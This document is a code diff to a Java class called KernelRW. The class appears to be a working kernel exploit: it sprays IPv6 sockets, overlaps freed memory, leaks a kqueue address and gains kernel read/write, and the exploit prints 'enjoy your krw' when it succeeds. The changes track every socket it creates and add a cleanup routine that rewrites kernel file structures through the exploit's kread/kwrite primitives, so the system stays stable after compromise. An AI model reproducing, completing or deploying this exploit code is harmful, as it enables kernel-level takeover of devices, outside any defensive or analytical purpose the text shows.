@@ -81,6 +81,8 @@ public class KernelRW extends Thread
 
     private int overlap_sock;
     private int[] spray_sock;
+    private int[] all_sock;
+    private int nsock = 0;
     private String log;
     private boolean triggered;
     private boolean done1;
@@ -113,9 +115,9 @@ public class KernelRW extends Thread
         return ans;
     }
 
-    private static int new_socket() throws Exception
+    private int new_socket() throws Exception
     {
-        return (int)C(socket, 28, 2);
+        return all_sock[nsock++] = (int)C(socket, 28, 2);
     }
 
     private int get_tclass(int sock, int which) throws Exception
@@ -349,6 +351,18 @@ public class KernelRW extends Thread
             kfree(((Long)it.next()).longValue());
     }
 
+    private void cleanup() throws Exception
+    {
+        long fd = kread8(kqueue_addr+0xa8);
+        long ofiles = kread8(fd);
+        for(int i = 0; i < nsock; i++)
+        {
+            long file = kread8(ofiles + 8 + 48*all_sock[i]);
+            if(!kwrite20(file+0x28, 999, 0, 0))
+                die();
+        }
+    }
+
     public String main() throws Exception
     {
         notify("starting exploit");
@@ -356,6 +370,7 @@ public class KernelRW extends Thread
         mem2048 = calloc(2048);
         for(int i = 64; i < 10000; i++)
             C(close, i);
+        all_sock = new int[2*SPRAY_SIZE];
         master_sock = new_socket();
         spray_sock = new int[SPRAY_SIZE];
         log += "sockets =";
@@ -469,6 +484,8 @@ public class KernelRW extends Thread
             C(close, spray_sock[i]);*/
         setStage("leaking kqueue");
         leak_kqueue();
+        setStage("cleaning up");
+        cleanup();
         notify("enjoy your krw");
         ok = true;
         KernelStuff.setRW(this);
